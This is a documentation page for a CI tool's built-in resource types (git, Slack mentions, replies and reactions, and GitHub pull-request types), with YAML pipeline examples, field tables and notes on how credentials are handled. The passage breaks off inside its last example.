# Resources

A **resource** is something outside the pipeline that has versions: a git branch, a queue of pull requests, a build artifact, a counter in a file. A **resource type** is the code that knows how to talk to one.

Every example on this page (and every other page) is a complete pipeline, verified by the test suite. Blocks that need the network or real credentials say so; everything else runs as shown.

```yaml noexec=network
resources:
  - name: repo        # the artifact directory a get creates, and the name steps use
    type: git         # which resource type
    source:           # configuration for that type — type-specific; a built-in refuses keys it does not read
      uri: https://github.com/jtarchie/ci.git
      branch: main

jobs:
  - name: build
    plan:
      - get: repo     # fetch it — the contents land in ./repo
      - task: compile
        inputs: [repo]
        run: cd repo && go build ./...
```

`git` ships with steps, so that pipeline needs no `resource_types:` block; neither do [the GitHub types](#the-built-in-github-types), [the Linear types](#the-built-in-linear-types), Slack's, `cron`, [`registry-image`](#the-built-in-registry-image-type), [`docker-service`](#the-built-in-docker-service-type) and [`webhook`](webhooks.md). For anything else, you write the type yourself.

**A built-in type's `source:` and `params:` are closed.** steps owns every built-in's code, so it knows each key the type reads, and `steps validate` refuses the rest: a misspelled `chanels:` or a Concourse habit like `params: {depth: 1}` on a get is a load error naming the key and the ones the type does read, not a setting nobody applies. No built-in's get takes `params:`; what it fetches is set on `source:`. Values are typed as well, so `limit: "200"` is refused where `limit: 200` loads. A type you write keeps Concourse's rule, where `source:` and `params:` are the type's own business and steps passes them through unread — and so does a pipeline that declares its own type under a built-in's name, which replaces the built-in: that is the pipeline's choice to make. `webhook` is the one name that cannot be taken, since deliveries are routed to a resource by it.

## The built-in `git` type

| `source:` field | required | meaning |
|---|---|---|
| `uri` | yes | anything `git` can clone — https, ssh, or a local path |
| `branch` | no | omitted follows the remote's `HEAD` |
| `fetch` | no | `true` refreshes a local-path `uri` before each check; default `false` |
| `tag_pattern` | no | a glob such as `v*`: track tags instead of a branch; see [Tags](#tags) |
| `token_env` | no | the variable holding an https token; see [Credentials](#credentials) |
| `private_key_env` | no | the variable holding an ssh private key; see [Credentials](#credentials) |
| `paths` | no | git pathspecs: only a commit that changes one of them is a new version; see [Paths](#paths) |
| `ignore_paths` | no | git pathspecs taken back out: a commit that changes only these is no new version |

A local-path `uri` costs no network clone — the right call for a large repository — but the check reads that clone's refs as they are, so the version is whatever the clone last fetched, however long ago that was. `fetch: true` fixes that: each check first fetches `branch` from the clone's remote (`branch.<name>.remote`, else `origin`) into `refs/remotes/<remote>/<branch>` and reports that ref, so the version is the remote's head. It moves exactly that one ref — never the working tree, a local branch, tags or `FETCH_HEAD` — so a developer's own `main` sitting behind changes nothing. It needs an absolute path and a `branch:` (both checked at load; a remote `uri` is refused, being fresh already), git 2.32 or newer (what `GIT_CONFIG_GLOBAL` needs; every command of this type sets it), a clone owned by the user running steps, and a remote the resource can reach with what its `source:` names (see [Credentials](#credentials)): an ssh remote with neither `token_env` nor `private_key_env` fails the check by name, and a poll has no terminal, so a prompt fails the fetch instead of waiting. A failed fetch fails the check, so `steps web` reports no version rather than a stale one; like any failing check, it holds back only this resource until a later check succeeds, and the pipeline's other resources keep triggering. Turning `fetch:` on changes which commit is reported, and `source:` is part of the cache key, so expect one fresh build. The built-in type refuses any other `source:` key, so a misspelled `fecth:` is a load error rather than a flag nobody reads.

```yaml noexec=network
resources:
  - name: repo
    type: git
    source:
      uri: /srv/clones/steps # an absolute path to a local clone
      branch: main
      fetch: true            # report the remote's main, not whatever the clone last fetched

jobs:
  - name: build
    plan:
      - get: repo
        trigger: true
      - task: compile
        inputs: [repo]
        run: cd repo && go build ./...
```

It fetches the exact commit the plan pinned, shallowly, so a branch that moves mid-run still gives you the version that was planned.

### Running it in an image

The type runs the `git` binary on the machine steps runs on. To run it in a container instead, as Concourse runs every resource type, name it in `resource_types:` with only `image:`: the entry is the built-in, with all of its rules, run in that image. The image needs `git` and `sh`. steps picks no default, so nothing is downloaded that the pipeline does not name. An entry that sets `config:` is a type of its own and replaces the built-in.

```yaml noexec=network
resource_types:
  - name: git
    image: alpine/git          # the built-in's check, in and out run here

resources:
  - name: repo
    type: git
    source:
      uri: https://github.com/jtarchie/steps.git
      branch: main

jobs:
  - name: build
    plan:
      - get: repo
      - task: compile
        image: golang:1.26
        inputs: [repo]
        run: cd repo && go build ./...
```

`env:`, `user:`, `network:` and the rest of a type's [container settings](infra.md#container-execution-image) apply as they would to any type. The `github-prs` and `github-comments` types take the same entry for [`checkout: git`](#checkout-git-a-repository-to-run-git-in). The other built-ins run no command, so an entry giving one of them an image is a load error.

A `uri:` that is a path on this machine (an absolute or relative path, or `file://`, which `fetch: true` always is) is refused under an image: the container cannot see the path. Give a remote uri, or drop the image.

### Paths

`paths:` narrows a branch to the commits that change something under them, as Concourse's git resource does: the version is the newest such commit, so a commit elsewhere in the repository is no new version and triggers nothing. `ignore_paths:` takes paths back out, and works alone too (every commit but those that touch only, say, `docs/`).

```yaml noexec=network
resources:
  - name: tools-image-src
    type: git
    source:
      uri: https://github.com/jtarchie/steps.git
      branch: main
      paths: [Dockerfile, go.mod]            # only a commit that changes one of these is a new version
      ignore_paths: ["*.md"]                 # and not one that changes only markdown

jobs:
  - name: build
    plan:
      - get: tools-image-src
      - task: show
        inputs: [tools-image-src]
        run: git -C tools-image-src log -1 --format=%s -- Dockerfile go.mod | grep -c .
        assert:
          stdout: "1"
    assert:
      execution: [tools-image-src, show]
      outcome: succeeded
```

- **Entries are git pathspecs**: a directory (`images/tools`) covers what is under it, and `*`, `?` and `[...]` match as git's do, across `/`.
- **The checked-out commit is the one that touched them**, not the branch's head: a get gives you the tree as of that commit, which for a build triggered by those paths is the tree that changed.
- **No commit touching them yet is no versions**, not an error.
- **How it is read.** A remote `uri` is cloned for each check, bare and without file contents (a pathspec reads trees, not blobs); with `fetch: true` the local clone's fetched branch is read in place, with no clone at all. `ls-remote`, the plain check, cannot say which files a commit changed.
- **Not with `tag_pattern`**: a tag is a version whatever its commit touched, so the load refuses the pair.

### Tags

`tag_pattern` makes the resource follow tags, not a branch. A check lists the remote's tags matching the glob and returns one version per tag, oldest first by version order (`v2` before `v10`, where plain sorting would put `v10` first), each `{tag, ref}` with `ref` the commit the tag points at: an annotated tag is peeled to its commit, so `ref` is the same sha a branch version carries. A repository with no matching tag has no versions yet, which is not an error. A get checks out that commit with full history and every tag, because release tooling reads both (a changelog finds the previous tag with `git describe --tags --abbrev=0 <tag>^`); it is the one place this type is not shallow. `git describe --tags --exact-match` names the checked-out tag, and fails with `tag <name> moved since it was checked` if the tag now points elsewhere: a moved tag would otherwise build a commit nobody planned. The version carries `ref`, so a tag that is moved to a new commit is a new version.

Tags are read-only here. `tag_pattern` is refused at load together with `branch`, with `fetch: true` (which refreshes a clone's branch; tags are listed from the `uri` itself, local path or remote) and on a resource a job puts to. `token_env` and `private_key_env` apply to the check and the get exactly as they do for a branch. Concourse's `tag_filter` and `tag_regex` instead walk a branch's history for tagged commits; this is steps' own.

```yaml noexec=network
resources:
  - name: release-tag
    type: git
    source:
      uri: https://github.com/jtarchie/steps.git
      tag_pattern: "v*"      # v1.2.0, v1.10.0, ...: one version per tag, oldest first

jobs:
  - name: build
    plan:
      - get: release-tag
        trigger: true
      - task: show
        inputs: [release-tag]
        run: git -C release-tag describe --tags --exact-match
```

### Credentials

A git resource authenticates with what its `source:` names and **nothing else**, as Concourse's git resource does by running in a container. Nothing of yours is read: not `~/.gitconfig`, its credential helpers or `url.<base>.insteadOf` rewrites, not `~/.ssh/config`, your ssh agent or your default keys. A poll runs unattended, and one that reached an agent which asks a person would ask every interval.

- With neither `token_env` nor `private_key_env`, a public https `uri` and a local path work, and nothing else does. An ssh `uri` is a load error, and `fetch: true` on a clone whose remote is ssh fails the check naming `token_env`.
- A local `uri`'s own `.git/config` is still read: that clone is what `source:` names.
- `token_env` answers git's https credential request with `x-access-token` and the variable's value. It needs an https `uri`. With `fetch: true` the clone's remote is fetched at its https form even when it is spelled `git@host:path` or `ssh://`, into the same `refs/remotes/<remote>/<branch>`, so a developer's ssh origin never reaches the ssh agent.
- `private_key_env` writes the key to a file only the step's user can read, removed when the command ends, and runs ssh with no config file, no agent and that key alone. It needs an ssh `uri`. Host keys are not checked, as Concourse's git resource does not check them.
- The variable must be one the resource's commands can see: listed in its `env:`, or a key of its [`secrets:`](secrets.md), which keeps the value out of the daemon's own environment and masks it in output. Either way it is read inside the shell, never written into the rendered command. Unset or empty fails the command by name.

Setting both is a load error: a resource authenticates one way.

### Pushing: `put`

A put pushes `HEAD` of a directory in its inputs to `uri`, or the commit `ref` names. The names are Concourse's git resource's, plus `force_with_lease` and `ref`:

| `params:` field | required | meaning |
|---|---|---|
| `repository` | yes | the repository to push, a path inside the put's `inputs:` |
| `branch` | unless `source.branch` | the branch to push to; overrides `source.branch` |
| `force` | no | push even if the branch is not an ancestor of `HEAD` |
| `force_with_lease` | no | a commit sha the remote branch must still be on, or the push fails; a forced push that cannot overwrite someone else's |
| `ref` | no | a commit sha, or any revision `git rev-parse --verify <ref>^{commit}` accepts, inside `repository`, pushed instead of `HEAD`; one that is no commit fails the put naming `params.ref` before anything is sent. Combines with `force` and `force_with_lease`, so a put can push exactly the sha an earlier step checked, under a lease |

It never runs the tree's hooks (`--no-verify`): an earlier step may have run the repository's own setup, and a pre-push hook would run holding the credential. The put's version is `{ref}`, the sha it pushed (the one `params.ref` resolved to, when set), and lands in this resource's history like any put's — so as in Concourse, a pipeline that triggers on one branch and pushes another uses two resources, one to read and one to write.

```yaml noexec=credentials
resources:
  - name: app
    type: git
    env: [GH_TOKEN]
    source:
      uri: https://github.com/acme/app.git
      branch: main
      token_env: GH_TOKEN        # this token only

  - name: release
    type: git
    env: [GH_TOKEN]
    source:
      uri: https://github.com/acme/app.git
      branch: release
      token_env: GH_TOKEN

  - name: mirror
    type: git
    env: [MIRROR_KEY]
    source:
      uri: git@git.example.com:acme/app.git
      private_key_env: MIRROR_KEY  # this key only: no ~/.ssh/config, no agent

jobs:
  - name: promote
    plan:
      - get: app
        trigger: true
      - get: release
      - task: lease
        inputs: [release]
        outputs: [meta]
        run: git -C release rev-parse HEAD > meta/lease
      - load_var: lease
        inputs: [meta]
        file: meta/lease
      # Move release to main's head, unless someone pushed to release since the get above.
      - put: release
        inputs: [app]
        params:
          repository: app
          force_with_lease: ((.:lease))
      - put: mirror
        inputs: [app]
        params:
          repository: app
          branch: main
          ref: HEAD~1   # the commit before HEAD; a sha an earlier step checked works the same
          force: true
```

## The built-in `slack-mentions`, `slack-reply` and `slack-reaction` types

Three more built-ins, all [expression-backed](expr.md) — Slack is a JSON HTTP API and nothing else, so there is no container and no `curl`/`jq` dependency to carry. `slack-mentions` is get-only: every unanswered `@mention` of the bot in a channel, plus every message in a 1:1 DM (no `@mention` required there — nobody types one in a 1:1 chat), oldest first, as a `{channel, ts, thread_ts, user}` version — `ts` is the message that named the bot, `thread_ts` the thread it lives in (the same value, for a top-level message), `user` who wrote it. `slack-reply` is put-only: posts a message, threaded or top-level. `slack-reaction` puts an emoji on a message, takes one off, or swaps one for another in a single publish — and, as a get, watches for messages the token's user reacted to with a given emoji ([below](#watching-for-a-reaction-a-slack-reaction-get)).

Cold start does not mean a backlog: like every resource, the first-ever check of a freshly-deployed `slack-mentions` records everything it finds and answers only the newest of it — see [Version history](#version-history) below. That rule is a `steps web` behavior; `steps run` has no persisted cursor, so every `steps run` check is a first check.

A cursorless check is also **bounded in what it asks Slack**. Finding a mention written as a reply means one `conversations.replies` call per thread, and the cursor is what normally keeps that set small — no cursor means every thread that has ever been replied to qualifies. On a workspace with more threads than the rate limit allows calls for, that check gets throttled, and a throttled check reports no version, which leaves no cursor for the next one: a watcher that can never run once. So a check with no cursor looks at the five most recently active threads and stops.

Under `steps web` that costs nothing that is ever built: everything below the newest version a first check reports is marked already-taken, and the cursor it leaves behind lifts the bound for every poll after it. Under `steps run` the bound never lifts, because no cursor is ever persisted — a mention written inside the sixth-most-recently-active thread is not delivered. Use `steps web` for a Slack bot; `steps run` is for a one-shot answer to whatever is most recent.

```yaml noexec=network
resources:
  - name: mentions
    type: slack-mentions
    source:
      channels: [] # optional; [] (the default) is every channel the bot is in
      limit: 200    # optional; per-channel messages fetched per check, default 200
      token_env: SLACK_BOT_TOKEN  # optional; the default
      base_url: https://slack.com # optional; the default — a test points it at a fake

  - name: reply
    type: slack-reply
    source:
      base_url: https://slack.com # optional; the default

  - name: reaction
    type: slack-reaction
    source: {}

  # A second bot, in the same pipeline, answering as someone else: env: adds
  # SECOND_BOT_TOKEN to just THIS resource's own allow-list (the type's own
  # env: still only names SLACK_BOT_TOKEN), and source.token_env picks it.
  - name: reply-as-support-bot
    type: slack-reply
    env: [SECOND_BOT_TOKEN]
    source:
      token_env: SECOND_BOT_TOKEN

jobs:
  - name: answer-mention
    plan:
      - get: mentions
        trigger: true
        version: every    # answer every mention found, not just the newest
      - put: acknowledge       # 👀 — somebody is on it
        resource: reaction
        inputs: [mentions]     # the reaction type picks the mention's ts
        params: {add: eyes}
      - task: compose
        outputs: [answer]
        run: echo "got it, working on it" > answer/reply.md
        on_failure:            # ❌, and the 👀 goes away
          put: failed
          resource: reaction
          inputs: [mentions]
          params: {add: x, remove: eyes}
      - put: reply
        inputs: [mentions, answer] # the reply type picks the mention's thread_ts
        params: {from: mentions}   # optional with one fetched input; names it when there are several
      - put: answered          # ✅, and the 👀 goes away in the same publish
        resource: reaction
        inputs: [mentions]
        params: {add: white_check_mark, remove: eyes}
```

All three need `SLACK_BOT_TOKEN` (a bot token, `xoxb-`) in the environment, for an app with `chat:write`, `reactions:write`, `channels:history`, `channels:read`, `im:history` and `im:read` (plus `groups:history`/`groups:read` for private channels), installed to the workspace and **invited** to every channel it should watch or post to. Membership is what grants both reading history and appearing in `users.conversations`, so `/invite` *is* the subscribe action — `app_mentions:read` is not needed, since this polls rather than using the Events API.

1:1 DMs are always watched too, with no `@mention` required — there is no `source:` field to turn this off. Group DMs (`mpim`) are not watched at all; a group is closer to a channel (several humans, bot is one more party) than a 1:1, so it keeps the explicit-mention rule instead.

| `source:` field (any of the three) | required | meaning |
|---|---|---|
| `channels` (`slack-mentions`) | no | `[]` watches every channel (and 1:1 DM) the bot is in; a list of ids narrows it |
| `limit` (`slack-mentions`) | no | per-channel messages fetched per check, default `200` |
| `emoji` (`slack-reaction`) | to get | the emoji to watch for, no colons |
| `done` (`slack-reaction`) | no | an emoji that, left by the token's user, means "answered": the message is no longer reported |
| `limit` (`slack-reaction`) | no | `reactions.list` page size, default `100` |
| `pages` (`slack-reaction`) | no | how many pages a check reads, default `5` |
| `channel` (`slack-reply`) | no | where a put with no fetched input and no `thread/channel` file posts, as a top-level message: a channel id, or a user id for a DM |
| `base_url` (any) | no | overrides `https://slack.com` — for pointing a test at a fake server |
| `token_env` (any) | no | overrides `SLACK_BOT_TOKEN` as the env var name to read the token from |

`token_env` alone isn't enough to widen what a resource can read — `env()` only sees names its resource TYPE already declares (all three declare `SLACK_BOT_TOKEN`, shared by every resource of that type), which is what keeps a shared, possibly-external expr type from reading whatever variable a `source:` names. A resource naming a different token also needs `env:` *on the resource itself* to add that name to its own allow-list — `env:` and `source:` together, as in `reply-as-support-bot` above. Naming `token_env` without the matching `env:` entry is a run-time error (`env(...): not in this resource type's env:`), not a silent fall-back to `SLACK_BOT_TOKEN`. (`env:` on a resource only means something for an expr- or shell-backed type — an mcp-backed type authenticates via its `mcp_servers:` entry and rejects `env:` at load time.)

**A mention inside a thread arrives with its thread.** `mentions/thread.json` is the whole conversation the mention was written in (Slack's `conversations.replies` payload: parent first, then replies), fetched by `thread_ts` — asking Slack for a *reply's* `ts` answers with that one message and nothing around it, which is an agent being handed a question with no context. `slack-reply` posts the answer back with `thread_ts` too: a reply's `ts` is not a thread id.

**`mentions/user` is who asked**: the Slack user id of the person whose message is the mention, never the author of the thread it was written in. It is the file an agent step's [`memory: { scope_from: mentions/user }`](agents.md#memory-across-runs-memory) names, so a bot's memory is filed per person. The id rides in the version (as `thread_ts` does) because `thread.json` can be cut off at exactly the end where the mention is. A version recorded before it carried one looks the author up in the thread instead, and writes an empty file if that fails, which a `memory:` step refuses rather than guessing.

**A reaction goes on the message; a reply goes to the thread — and the types choose.** Both read the mention off the put's `slack-mentions` input with [`version()`](expr.md#versionname--version): `slack-reply` posts to its `thread_ts`, `slack-reaction` marks its `ts`, because they want different values out of the same version — `thread_ts` is the conversation to answer in, while `ts` is the one message a person actually wrote. Hand a reaction the thread's id and the emoji lands on the parent of the thread instead — indistinguishable from correct when the mention was top-level, wrong every time somebody asked inside an existing conversation. That choice is made once, in each type, rather than in every pipeline. With more than one fetched input (`inputs: all`, or a second get), `params: {from: mentions}` names the one to answer; without it the put fails naming them.

A `slack-reaction` put takes `params.add` (an emoji name, no colons), `params.remove`, or both for a swap in one publish. At least one is required: a put with neither is refused at load, as a [`github-reaction`](#the-built-in-github-types) one is.

**Marking a message twice is not an error.** `already_reacted` (the emoji this put wanted is already there) and `no_reaction` (the one it wanted gone is already gone) are the API saying the world is in the state being asked for, so the put succeeds. They arrive on any replay, resume, or re-run, and failing there would turn re-running a build into a red one over an emoji. Every other refusal fails the put — most usefully `missing_scope`, since `reactions:write` is not implied by `chat:write` and a bot that quietly stops marking anything is a failure nobody notices.

**A mention inside a thread counts**, and `limit:` is what decides whether it can be found. Slack's `conversations.history` returns top-level messages only, and a reply does not change its parent's `ts` — so the window the check reads channel history over is `limit` messages, deliberately *wider* than the cursor, and the cursor decides only what inside that window is new. A thread whose parent carries a `latest_reply` newer than the cursor is read; every other thread costs nothing.

**Three known gaps** remain, all bounded by a limit and all needing Slack pagination to close:

- A thread whose parent has scrolled past `limit` messages of its channel's history is invisible, however active the thread still is. How long that takes is how chatty the channel is; raising `limit:` buys more room, but only as much as Slack allows: since 2025-05-29 a bot **distributed** outside the Marketplace is capped at 15 messages per request and one request a minute, whatever `limit:` says. An internal app built for a single workspace — the usual case for a self-hosted pipeline — is excluded from that cap and honors `limit:` as written.
- `mentions/thread.json` is truncated at its *newest* end for a thread longer than 1000 messages — Slack returns a thread oldest-first — so the mention itself can be missing from a very long thread.
- More than `limit` new top-level messages in one channel between two checks lose the overflow *permanently*, not just delayed — the cursor advances to the newest `ts` seen anywhere, so whatever `limit` cut off now sits below the new cursor and is never asked for again.

Where each put type aims comes from a fetched `slack-mentions` input (or the one `params.from` names). With no fetched input — a top-level post to a fixed channel, or a message that did not come from a mention — it reads files an upstream step wrote instead. The text is a file: `file()` takes what `inputs:` put on disk directly, so a reply containing backticks or `$(…)` is data, never something a shell might run. Job-level hooks take no `inputs:` and run outside any one build, so a ❌ belongs on a step's `on_failure:`, as above, and a hook posts with [`source.channel` and `params.text`](#a-job-level-hook-posts-with-sourcechannel-and-paramstext) instead.

| file | read by | required | meaning |
|---|---|---|---|
| `answer/reply.md` | `slack-reply` | unless `params.text` | the message text |
| `thread/channel` | `slack-reply` | without a fetched input or `source.channel` | the channel id to post to |
| `thread/ts` | `slack-reply` | no | a parent message's `ts` — posts as a reply in that thread; omit to post a new top-level message |
| `target/channel` | `slack-reaction` | without a fetched input | the channel id of the message to mark |
| `target/ts` | `slack-reaction` | without a fetched input | the `ts` of the message to mark |

**Where a `slack-reply` posts, in order:** the fetched input's version (a thread reply), else the `thread/` files, else `source.channel` (a top-level message). A put with none of the three fails naming all of them.

### A job-level hook posts with `source.channel` and `params.text`

A job's `on_failure`/`on_error` hook runs in an empty workspace: no `inputs:`, so no mention and no files. `source.channel` is where it posts instead, and `params.text` is the message, so a hook can DM you when a build breaks. Slack takes a user id (the `U…` in a profile's "Copy member ID") as a channel and opens the DM with the bot, so `source.channel` is either one. `params.text` is data like the file, sent as JSON and never through a shell, and it is refused when empty or when the put also carries `answer/reply.md`. A hook's own fields take no `((var))`, but a resource's `source:` does, so `channel:` is where a per-machine user id goes. This job fails on purpose and its `assert:` clears that, to show the hook ran.

```yaml slack=hook-dm
resources:
  - name: operator-dm
    type: slack-reply
    source:
      channel: U024BE7LH # a user id DMs; a channel id (C…) posts to the channel

jobs:
  - name: build
    plan:
      - task: compile
        run: "false"
    assert:
      execution: [compile, notify]
      outcome: failed
    on_failure:
      put: notify
      resource: operator-dm
      params: {text: "the build job failed; `steps runs -p build` knows more"}
```

There is deliberately no `check:`/`in:` on `slack-reply` and no `out:` on `slack-mentions` — `get: reply` or `put: mentions` are both load errors, as a `put` is against any type without an `out:`.

### Watching for a reaction: a `slack-reaction` get

React to any message with an emoji and a build answers it. `source.emoji` makes a `slack-reaction` resource a watcher; its check reports every message the **token's user** reacted to with that emoji, oldest first, as the same `{channel, ts, thread_ts, user}` version `slack-mentions` reports — so `slack-reply` answers in the thread and a `slack-reaction` put marks the message, reading it unchanged. `noexec` because it reaches a real workspace.

```yaml noexec=network
resources:
  - name: tagged
    type: slack-reaction
    env: [SLACK_USER_TOKEN]
    source:
      token_env: SLACK_USER_TOKEN # a user token: whose reactions count
      emoji: robot_face           # the ask
      done: white_check_mark      # your own ✅ = answered, never reported again
      limit: 100                  # optional; reactions.list page size, default 100
      pages: 5                    # optional; pages a check reads, default 5
      base_url: https://slack.com # optional; the default

  - name: reply
    type: slack-reply
    env: [SLACK_USER_TOKEN]
    source: {token_env: SLACK_USER_TOKEN}

  - name: mark                    # a second resource: a watcher cannot be put to
    type: slack-reaction
    env: [SLACK_USER_TOKEN]
    source: {token_env: SLACK_USER_TOKEN}

jobs:
  - name: answer
    plan:
      - get: tagged
        trigger: true
        version: every
      - task: compose
        inputs: [tagged]
        outputs: [answer]
        run: echo "on it" > answer/reply.md
      - put: reply
        inputs: [tagged, answer]
      - put: mark
        inputs: [tagged]
        params: {add: white_check_mark, from: tagged}
```

**The token decides whose reactions count.** Slack's `reactions.list` lists the reactions the token's own user made, and nothing else. A user token (`xoxp-`, with `reactions:read`) makes the watch "messages I reacted to"; the default bot token watches only reactions the bot itself left. Watching anybody's reaction is the Events API's `reaction_added`, a [webhook](webhooks.md), not a poll.

**`done` is the durable "answered".** Your own done emoji on a message drops it from the check, and it lives in Slack rather than the state database, so resetting the database cannot answer a thread twice — and adding it by hand suppresses a message. Each item carries the message's whole reaction list, so both filters require the token's user among that emoji's users: a message where you left 👍 and someone else left the watched emoji does not match.

**A watcher cannot be put to.** A put records its own version on the resource it publishes to, and the watching get would fetch that as new and answer the message again — so a put to a resource with `source.emoji` is refused at load, as is a get from a `slack-reaction` resource without one. Mark through a second resource, as `mark` above does.

**There is no cursor.** `reactions.list` reports no reaction time, so a cursor over message `ts` would make reacting to an old message do nothing. Each check reads up to `pages` pages of `limit` items and lets version identity dedupe. Slack does not document the list's order: if it is by message age, a freshly reacted old message sits deep and only `pages` decides whether it is found.

Besides `version.json`, `thread.json` and `user` (who wrote the reacted message), the get writes **`message.json`**: the reacted message itself, so nothing downstream has to find it in the thread by `ts`. A thread longer than 1000 messages is cut at its newest end, where a fresh reaction usually is, so a message missing from `thread.json` is fetched on its own.

## The built-in GitHub types

Ten built-ins, split by what they do, the way the Slack ones are. `github-prs`, `github-comments`, `github-issues` and `github-releases` **find work**: they have a check and an in, and no out. `github-pr-comment`, `github-pr-review`, `github-reaction`, `github-label`, `github-issue` and `github-pr` **publish**: they have an out and nothing else. The split is not tidiness. A put records its version in its own resource's history, so one type that both watched pull requests and commented on them would put every comment it posted into the history it triggers from.

steps talks to GitHub itself. Nothing needs `gh`, `git` or `curl`, on this machine or any other, and the tree a get fetches is an ordinary artifact here: a task under [`image:`](infra.md#container-execution-image) or [`tags:`](infra.md#remote-workers-tags) reads it the way it reads any other. That also means none of the ten can be placed with `tags:` themselves, as for every type that runs inside this process.

All ten read a token from `GH_TOKEN`, the variable `gh` reads first, so `export GH_TOKEN=$(gh auth token)` is the whole setup on a machine where `gh` is logged in. `source.token_env` names a different variable, for a second identity. The token is required, not optional: GitHub gives an unauthenticated caller sixty requests an hour, which a poller spends in minutes. `steps validate` refuses a pipeline whose token variable is unset, before anything runs.

Each reports [facts](#facts-what-a-get-or-put-says-about-its-version) from the answers GitHub already sends, at no extra request: a `github-prs` get the pull request's `url`, `title` and `author`; a `github-comments` get the comment's `url` and `author`; a `github-issues` get the issue's `url`, `title` and `author`; a `github-releases` get the release's `url`, `tag`, `name` and `commit_sha`; a `github-pr-comment` or `github-pr-review` put the new comment's or review's `url`; a `github-issue` put the new issue's `url` and `title`; a `github-pr` put the pull request's `url` and `title`. `github-reaction` and `github-label` create nothing with a page of its own and report none.

### `github-prs`: open pull requests

```yaml github=review
resources:
  - name: pr
    type: github-prs
    source:
      repo: acme/app
      review_requested: "@me"    # quoted: @ cannot start a plain YAML value
      base: main
      labels: [ready-for-review]
      draft: false

  - name: summary
    type: github-pr-comment
    source:
      repo: acme/app

jobs:
  - name: review
    plan:
      - get: pr
        trigger: true
        version: every           # one build per pull request, and per push to it
      - task: read
        inputs: [pr]
        outputs: [notes]
        run: |
          echo "#$(cat pr/pr.number) changes $(grep -c '^diff --git' pr/pr.diff) file(s) since $(cut -c1-7 pr/pr.mergebase)" | tee notes/body.md
          test -x pr/bin/test.sh
        assert:
          stdout: "#42 changes 2 file(s) since 1a2b3c4"
      - put: summary
        inputs: [pr, notes]
        params:
          body_file: notes/body.md
          from: pr               # optional here: pr is the only input naming a pull request
    assert:
      execution: [pr, read, summary]
      outcome: succeeded
```

A version is `{number, sha}`: the pull request and its head commit, so a push is a new build and a wording change to the title is not. The check reports them by number, oldest first. Every filter narrows, and a pull request is a version only while it is open and matches all of them:

| `source:` field | required | meaning |
|---|---|---|
| `repo` | yes | `owner/name` |
| `author` | no | who opened it |
| `assignee` | no | someone it is assigned to |
| `review_requested` | no | someone whose review it directly requests; GitHub clears the request once they submit one, so the trigger empties itself |
| `labels` | no | labels that must all be on it |
| `base` | no | the branch it would merge into |
| `draft` | no | `true` keeps only drafts, `false` only ready ones; both when unset |
| `checkout` | no | `false` skips the tree and writes only the metadata files; `git` lays down a git repository instead of the tree ([below](#checkout-git-a-repository-to-run-git-in)); default `true` |
| `include` | no | `[reviews]` also writes the pull request's reviews ([below](#include-reviews-what-reviewers-have-said)); default none |
| `token_env` | no | the variable holding the token; default `GH_TOKEN` |
| `endpoint` | no | the REST API base; default `https://api.github.com`, and `https://<host>/api/v3` for GitHub Enterprise Server; plain `http` is accepted only for a loopback host (`localhost`, `127.0.0.0/8`, `::1`), because the token would otherwise travel in cleartext |

`@me` in any of the three login fields is the token's own user. A get writes the tree at the version's commit, then these beside it:

| file | what it holds |
|---|---|
| `pr.json` | the pull request, as GitHub's API describes it |
| `pr.diff` | the change as of the version's commit, against where it branched from `base` |
| `pr.number`, `pr.sha` | the version |
| `pr.mergebase` | the commit it branched from, for a step that wants to stage the change onto it |
| `pr.url` | its page |
| `pr.reviews.json` | with `include: [reviews]`: the submitted reviews, oldest first |
| `pr.pending_review.json` | with `include: [reviews]`: the token user's own unsubmitted draft, and only when there is one |

The diff and the merge base are computed against the version's commit rather than read from the pull request, whose own diff is always of its *current* head, so a pinned or replayed version sees the change as it was. A repository that has a file of one of those names at its root is refused by name rather than overwritten; set `checkout: false` and fetch the tree with a `git` resource there.

#### `include: [reviews]`: what reviewers have said

A pipeline that reviews a pull request more than once wants to know what it already said: how many reviews it has sent, and whether a draft of its own is already waiting. That lives on GitHub, beside the pull request, where a wiped state database cannot reset it. `include: [reviews]` writes it:

```yaml github=pr-reviews
resources:
  - name: pr
    type: github-prs
    source:
      repo: acme/app
      review_requested: "@me"
      checkout: false
      include: [reviews]

jobs:
  - name: review
    plan:
      - get: pr
        trigger: true
      - task: read
        inputs: [pr]
        run: |
          sent=$(grep -o '"state":"[A-Z]*"' pr/pr.reviews.json | tr '\n' ' ')
          draft=none
          test -f pr/pr.pending_review.json && draft=$(grep -o '"body":"[^"]*"' pr/pr.pending_review.json)
          echo "sent: ${sent}draft: $draft"
        assert:
          stdout: 'sent: "state":"COMMENTED" "state":"APPROVED" draft: "body":"half written"'
    assert:
      execution: [pr, read]
      outcome: succeeded
```

`pr.reviews.json` is every submitted review, as GitHub's objects, oldest first. `pr.pending_review.json` is the token user's own draft, kept apart from them: GitHub lists a draft to its author alone, and a step that hands `pr.reviews.json` to something public must never publish a review its author has not sent. Anybody else's draft is never listed. Both are read at the get, not at the commit, so they are as of the first fetch of the version: the resource cache keeps that fetch for it, and a review sent afterwards arrives with the next push. The listing stops at 1000 reviews.

#### `checkout: git`: a repository to run git in

The tree GitHub archives has no history, so `git merge-base`, `git diff origin/main...HEAD` and a push from it are impossible. `checkout: git` lays down a git repository instead, cloned by steps from the repository GitHub names for the pull request:

- `HEAD` is the version's commit, detached;
- `origin/<base>` is the base branch as of the get;
- the history reaches the merge base of the two and, as far as GitHub's count of commits on each side allows, no further, so a large repository costs what the pull request touches. A base branch that moved between the count and the fetch deepens to full history rather than stop short;
- the metadata files are written beside the tree as usual and listed in `.git/info/exclude`, so `git status` is clean and `git add -A` leaves them out;
- the commit is fetched by id, then through `refs/pull/<number>/head` when a server refuses that. GitHub keeps every pull request's head there, a fork's included, so a pull request from a fork needs no access to the fork.

The clone runs the `git` binary on the machine steps runs on, or in an image when `resource_types:` names the type with only `image:` ([as `git` does](#running-it-in-an-image)), under the built-in [`git`](#the-built-in-git-type) type's rules: nothing of the operator's git configuration, credential helpers or ssh is read, nothing prompts, and the token is the one `token_env` names. It is sent as a header scoped to the clone URL and written nowhere, so `.git/config` holds no credential and a later step's `git fetch` in the repository is unauthenticated: give it a token of its own, as a [`git`](#the-built-in-git-type) put does.

```yaml github=checkout-git
resources:
  - name: pr
    type: github-prs
    source:
      repo: acme/app
      checkout: git

jobs:
  - name: review
    plan:
      - get: pr
        trigger: true
        version: every
      - task: changed
        inputs: [pr]
        run: |
          cd pr
          base=$(git merge-base HEAD origin/main)
          test "$base" = "$(cat pr.mergebase)"
          test -z "$(git status --porcelain)"
